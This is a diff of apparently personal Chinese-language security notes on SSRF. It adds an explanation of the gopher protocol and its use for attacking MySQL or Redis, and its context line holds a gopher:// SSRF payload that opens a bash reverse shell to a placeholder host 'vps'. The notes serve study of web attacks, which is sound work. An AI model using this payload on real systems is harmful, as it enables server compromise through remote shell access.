@@ -47,6 +47,20 @@ exp.php
 	gopher://127.0.0.1:80/_POST /exp.php HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 47%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i >%2526 /dev/tcp/vps/2333 0>%25261null
 
 
+## gopher协议
+
+gopher协议是一种信息查找系统，他将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。现在它基本过时，人们很少再使用它。虽然很古老但现在很多库还支持gopher 协议而且gopher 协议功能很强大。
+
+它可以实现多个数据包整合发送，然后gopher 服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher 协议的curl 命令就能操作mysql 数据库或完成对redis 的攻击等等。
+gopher 协议使用tcp 可靠连接。
+
+它只支持文本，不支持图像
+
+**https://yinwc.github.io/2018/07/31/Gopher/**
+
+https://www.cnblogs.com/Konmu/p/12984891.html
+
+https://www.cnblogs.com/zhangqianxi/p/13337622.html
 
 ## php 中的 ssrf
 
